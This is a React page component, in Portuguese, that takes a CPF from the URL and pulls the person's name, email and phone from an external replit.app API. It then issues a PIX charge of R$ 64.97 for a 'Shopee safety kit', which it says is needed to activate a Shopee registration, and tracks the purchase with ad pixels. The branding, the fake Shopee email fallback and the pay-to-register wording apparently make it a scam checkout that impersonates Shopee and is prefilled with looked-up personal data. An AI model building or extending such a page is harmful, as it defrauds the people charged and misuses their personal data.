import React, { useState, useEffect, useRef } from 'react';
import { useRoute } from 'wouter';
import { useToast } from '@/hooks/use-toast';
import { useScrollTop } from '@/hooks/use-scroll-top';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from '@/components/ui/dialog';
import { Button } from '@/components/ui/button';
import QRCodeGenerator from '@/components/QRCodeGenerator';
import { Spinner } from '@/components/ui/spinner';
import { createPixPayment } from '@/lib/payments-api';
import { trackEvent, trackPurchase } from '@/lib/facebook-pixel';
import { trackKwaiPurchase } from '@/lib/kwai-pixel';
import { useLocation } from 'wouter';
import KwaiPixelHead from '@/components/KwaiPixelHead';
import FacebookPixelHead from '@/components/FacebookPixelHead';

import kitEpiImage from '../assets/kit-epi-new.webp';
import pixLogo from '../assets/pix-logo.png';

// Interface para o QR Code PIX
interface PixQRCode {
  pixCode: string;
  pixQrCode: string;
  id: string;
}

interface CpfData {
  id: number;
  nome: string;
  cpf: string;
  telefone: string;
  email: string;
  data_cadastro: string;
}

const CpfPayment: React.FC = () => {
  // Aplica o scroll para o topo quando o componente é montado
  useScrollTop();
  
  const [match, params] = useRoute('/:cpf');
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  
  // Estados do componente
  const [isLoadingCpf, setIsLoadingCpf] = useState(true);
  const [isLoadingPayment, setIsLoadingPayment] = useState(false);
  const [cpfData, setCpfData] = useState<CpfData | null>(null);
  const [pixInfo, setPixInfo] = useState<PixQRCode | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [timeLeft, setTimeLeft] = useState<number>(30 * 60); // 30 minutos em segundos
  const timerRef = useRef<number | null>(null);

  // Função para formatar o tempo restante
  const formatTime = (seconds: number): string => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  // Função para copiar código PIX
  const copiarCodigoPix = () => {
    if (pixInfo?.pixCode) {
      navigator.clipboard.writeText(pixInfo.pixCode).then(() => {
        toast({
          title: "Código copiado!",
          description: "Código PIX copiado para a área de transferência.",
          variant: "default",
        });
      }).catch((error) => {
        console.error('Erro ao copiar código PIX:', error);
        toast({
          title: "Erro ao copiar",
          description: "Não foi possível copiar o código PIX.",
          variant: "destructive",
        });
      });
    }
  };

  // Função para buscar dados do CPF na API Recoveryfy
  const fetchCpfData = async (cpf: string) => {
    try {
      console.log(`[CPF-PAYMENT] Buscando dados para CPF: ${cpf}`);
      
      // Nova API Recoveryfy
      const apiUrl = `https://recoverify1.replit.app/api/v1/cliente/cpf/${cpf}`;
      
      const response = await fetch(apiUrl, {
        method: 'GET',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json'
        }
      });
      
      if (response.ok) {
        const data = await response.json();
        console.log('[CPF-PAYMENT] Dados recebidos:', data);
        
        // Verificar se a consulta foi bem-sucedida e há dados do cliente
        if (data.sucesso && data.cliente) {
          setCpfData(data.cliente);
          
          // IMPORTANTE: Salvar dados no localStorage para uso posterior
          console.log('[CPF-PAYMENT] Salvando dados no localStorage:', data.cliente);
          
          // Salvar dados do usuário no formato esperado pela página de entrega
          const userData = {
            nome: data.cliente.nome,
            cpf: data.cliente.cpf,
            email: data.cliente.email,
            telefone: data.cliente.telefone,
            id: data.cliente.id,
            data_cadastro: data.cliente.data_cadastro
          };
          
          localStorage.setItem('candidato_data', JSON.stringify(userData));
          localStorage.setItem('user_name', data.cliente.nome);
          localStorage.setItem('user_cpf', data.cliente.cpf);
          localStorage.setItem('user_data', JSON.stringify(userData));
          
          console.log('[CPF-PAYMENT] Dados salvos no localStorage para uso posterior');
          
          // Automaticamente gerar o pagamento após obter os dados
          await generatePayment(data.cliente);
        } else {
          setError('CPF não encontrado nos registros.');
        }
      } else {
        setError('Erro ao consultar CPF. Tente novamente.');
      }
    } catch (error) {
      console.error('[CPF-PAYMENT] Erro ao buscar dados:', error);
      setError('Erro de conexão. Tente novamente.');
    } finally {
      setIsLoadingCpf(false);
    }
  };

  // Função para gerar pagamento
  const generatePayment = async (userData: CpfData) => {
    try {
      setIsLoadingPayment(true);
      
      console.log('[CPF-PAYMENT] Gerando pagamento para:', userData.nome);
      
      // Usar dados reais do cliente da API Recoveryfy, ou dados falsos se não disponíveis
      const pixData = await createPixPayment({
        name: userData.nome,
        cpf: userData.cpf,
        email: userData.email || 'cliente@shopee.com.br', // Usar email real ou fake
        phone: userData.telefone || '(11) 99999-9999' // Usar telefone real ou fake
      });
      
      console.log('[CPF-PAYMENT] Pagamento gerado com sucesso:', pixData);
      
      setPixInfo(pixData);
      
      // Rastrear evento de checkout iniciado no Facebook Pixel
      trackEvent('InitiateCheckout', {
        content_name: 'Kit de Segurança Shopee',
        content_ids: [pixData.id],
        content_type: 'product',
        value: 64.97,
        currency: 'BRL'
      });
      
      // Armazenar ID da transação para verificação posterior
      localStorage.setItem('current_payment_id', pixData.id);
      
      // Iniciar verificação de status imediatamente
      setTimeout(() => {
        verificarStatusPagamento(pixData.id);
      }, 1000);
      
    } catch (error: any) {
      console.error("[CPF-PAYMENT] Erro ao gerar pagamento:", error);
      setError(`Erro ao gerar pagamento: ${error.message || 'Tente novamente.'}`);
    } finally {
      setIsLoadingPayment(false);
    }
  };

  // Função para verificar status do pagamento na API Recoveryfy
  const verificarStatusPagamento = async (paymentId: string) => {
    console.log('[CPF-PAYMENT] Verificando status do pagamento:', paymentId);
    
    try {
      // Usar a API Recoveryfy para verificar status
      const response = await fetch(`https://recoverify1.replit.app/api/order/${paymentId}/status`);
      
      if (response.ok) {
        const statusData = await response.json();
        console.log('[CPF-PAYMENT] Status obtido:', statusData);
        
        // Verificar se o status é "approved"
        if (statusData.status === 'approved') {
          console.log('[CPF-PAYMENT] Pagamento APROVADO! Redirecionando para treinamento...');
          
          // Rastrear o evento de compra no Facebook Pixel e Kwai Pixel
          trackPurchase(paymentId, 64.97);
          trackKwaiPurchase(paymentId, 64.97);
          
          // Limpar o ID do pagamento do localStorage
          localStorage.removeItem('current_payment_id');
          
          // Exibir mensagem de sucesso
          toast({
            title: "Pagamento aprovado!",
            description: "Redirecionando para a página de treinamento...",
            variant: "default",
          });
          
          // Redirecionar para a página de treinamento instantaneamente
          setTimeout(() => {
            setLocation('/treinamento');
          }, 500);
          
          return; // Parar a verificação
        } else {
          // Se o status não for aprovado, agendar nova verificação em 1 segundo
          setTimeout(() => {
            verificarStatusPagamento(paymentId);
          }, 1000);
        }
      } else {
        console.error('[CPF-PAYMENT] Erro na API Recoveryfy:', response.status, response.statusText);
        
        // Em caso de erro HTTP, agendar nova tentativa em 1 segundo
        setTimeout(() => {
          verificarStatusPagamento(paymentId);
        }, 1000);
      }
    } catch (error) {
      console.error('[CPF-PAYMENT] Erro ao verificar status:', error);
      
      // Em caso de erro de rede, agendar nova tentativa em 1 segundo
      setTimeout(() => {
        verificarStatusPagamento(paymentId);
      }, 1000);
    }
  };

  // Efeito para carregar dados do CPF quando o componente montar
  useEffect(() => {
    if (params?.cpf) {
      const cleanCpf = params.cpf.replace(/\D/g, '');
      if (cleanCpf.length === 11) {
        fetchCpfData(cleanCpf);
      } else {
        setError('CPF inválido. Deve conter 11 dígitos.');
        setIsLoadingCpf(false);
      }
    } else {
      setError('CPF não fornecido na URL.');
      setIsLoadingCpf(false);
    }
    
    // Verificar se há um pagamento em andamento no localStorage
    const currentPaymentId = localStorage.getItem('current_payment_id');
    if (currentPaymentId) {
      console.log('[CPF-PAYMENT] Encontrado pagamento em andamento:', currentPaymentId);
      setTimeout(() => {
        verificarStatusPagamento(currentPaymentId);
      }, 1000);
    }
  }, [params?.cpf]);

  // Efeito para controlar o cronômetro de 30 minutos
  useEffect(() => {
    if (pixInfo && timeLeft > 0) {
      timerRef.current = window.setInterval(() => {
        setTimeLeft(prev => {
          if (prev <= 1) {
            if (timerRef.current) clearInterval(timerRef.current);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
    }

    return () => {
      if (timerRef.current) {
        clearInterval(timerRef.current);
      }
    };
  }, [pixInfo, timeLeft]);

  // Se está carregando dados do CPF
  if (isLoadingCpf) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="bg-white p-8 rounded-lg shadow-lg max-w-md w-full mx-4 text-center">
          <div className="flex justify-center items-center mb-6">
            <div className="animate-spin rounded-full h-12 w-12 border-4 border-[#E83D22] border-t-transparent"></div>
          </div>
          <h2 className="text-xl font-semibold text-gray-800 mb-2">Carregando dados...</h2>
          <p className="text-gray-600">Buscando informações do CPF na base de dados</p>
        </div>
      </div>
    );
  }

  // Se houve erro
  if (error) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="bg-white p-8 rounded-lg shadow-lg max-w-md w-full mx-4 text-center">
          <div className="text-red-500 mb-4">
            <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="mx-auto">
              <circle cx="12" cy="12" r="10"></circle>
              <line x1="12" y1="8" x2="12" y2="12"></line>
              <line x1="12" y1="16" x2="12.01" y2="16"></line>
            </svg>
          </div>
          <h2 className="text-xl font-semibold text-gray-800 mb-2">Erro</h2>
          <p className="text-gray-600 mb-4">{error}</p>
          <Button
            onClick={() => window.location.reload()}
            className="bg-[#E83D22] hover:bg-[#d73920] text-white"
          >
            Tentar Novamente
          </Button>
        </div>
      </div>
    );
  }

  // Renderização principal - cópia exata da estrutura do modal de pagamento
  return (
    <div className="min-h-screen bg-gray-50">
      <FacebookPixelHead />
      <KwaiPixelHead />
      <div className="container mx-auto px-4 py-8">
        <div className="max-w-md mx-auto">
          {/* Card principal com a mesma estrutura do modal */}
          <div className="bg-white rounded-lg shadow-lg overflow-hidden">
            {/* Header */}
            <div className="bg-[#E83D22] text-white p-4 text-center">
              <h1 className="text-lg font-semibold">Pagamento do Kit de Segurança</h1>
              <p className="text-sm opacity-90">
                Finalize o pagamento para ativar seu cadastro Shopee
              </p>
            </div>

            {/* Conteúdo */}
            <div className="p-4">
              {isLoadingPayment ? (
                <div className="flex flex-col items-center justify-center py-8">
                  <div className="flex justify-center items-center mb-4">
                    <div className="animate-spin rounded-full h-12 w-12 border-4 border-[#E83D22] border-t-transparent"></div>
                  </div>
                  <p className="text-gray-600">Gerando QR Code para pagamento...</p>
                </div>
              ) : pixInfo ? (
                <div className="space-y-3">
                  {/* Cabeçalho com imagem e dados */}
                  <div className="flex flex-row gap-2 items-start">
                    <div className="flex-shrink-0">
                      <img 
                        src={kitEpiImage} 
                        alt="Kit EPI Shopee" 
                        className="w-16 rounded-md"
                      />
                    </div>
                    <div className="flex-grow">
                      <h3 className="text-sm font-medium text-gray-800">Kit de Segurança Oficial</h3>
                      <p className="text-md font-bold text-[#E83D22]">R$ 64,97</p>
                      
                      <div className="w-full mt-1">
                        <p className="text-xs text-gray-600">
                          <span className="font-medium">Nome:</span> {cpfData?.nome}
                        </p>
                        <p className="text-xs text-gray-600">
                          <span className="font-medium">CPF:</span> {cpfData?.cpf}
                        </p>
                      </div>
                    </div>
                  </div>
                  
                  {/* Status de pagamento com spinner */}
                  <div className="flex items-center justify-center gap-2 py-1">
                    <div className="text-[#E83D22] animate-spin">
                      <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                        <path d="M21 12a9 9 0 1 1-6.219-8.56" />
                      </svg>
                    </div>
                    <p className="text-xs text-gray-600 font-medium">
                      Aguardando pagamento PIX...
                    </p>
                  </div>
                  
                  {/* QR Code */}
                  <div className="flex flex-col justify-center h-[35vh]">
                    <div className="flex flex-col items-center justify-center mb-2">
                      <img 
                        src={pixLogo}
                        alt="PIX Logo"
                        className="h-7 mb-2 mx-auto"
                      />
                      <QRCodeGenerator 
                        value={pixInfo.pixCode} 
                        size={160}
                        className="mx-auto"
                        alt="QR Code PIX" 
                      />
                    </div>
                    
                    {/* Tempo restante */}
                    <div className="bg-[#fff3e6] border-[#E83D22] border p-2 rounded-md mt-1 w-[75%] mx-auto">
                      <div className="flex items-center justify-center gap-2">
                        <div className="text-[#E83D22]">
                          <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                            <circle cx="12" cy="12" r="10"></circle>
                            <polyline points="12 6 12 12 16 14"></polyline>
                          </svg>
                        </div>
                        <div className="flex flex-col">
                          <p className="text-xs text-gray-700 font-medium">
                            PIX expira em <span className="text-[#E83D22] font-bold">{formatTime(timeLeft)}</span>
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>
                  
                  {/* Código PIX e botão copiar */}
                  <div className="h-[20vh]">
                    <p className="text-xs text-gray-600 mb-1 text-center">
                      Copie o código PIX:
                    </p>
                    <div className="relative">
                      <div 
                        className="bg-gray-50 p-2 rounded-md border border-gray-200 text-xs text-gray-600 break-all pr-8 max-h-[70px] overflow-y-auto"
                      >
                        {pixInfo.pixCode}
                      </div>
                      <Button
                        variant="ghost"
                        className="absolute right-1 top-1/2 transform -translate-y-1/2 text-[#E83D22] hover:text-[#d73920] p-1"
                        onClick={copiarCodigoPix}
                      >
                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                          <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                          <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                        </svg>
                      </Button>
                    </div>
                    
                    <div className="mt-2">
                      <Button
                        onClick={copiarCodigoPix}
                        className="bg-[#E83D22] hover:bg-[#d73920] text-white font-medium py-1 w-full text-xs rounded-[3px] shadow-md transform active:translate-y-0.5 transition-transform"
                        style={{ 
                          boxShadow: "0 4px 0 0 #c23218",
                          border: "none",
                          position: "relative",
                          top: "0"
                        }}
                      >
                        Copiar Código PIX
                      </Button>
                    </div>
                  </div>
                  
                  {/* Instruções */}
                  <div className="bg-red-50 p-2 rounded-md border border-red-300">
                    <p className="text-xs text-red-800 text-center">
                      Após o pagamento, retorne a esta página para finalizar o cadastro.
                    </p>
                  </div>
                </div>
              ) : null}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default CpfPayment;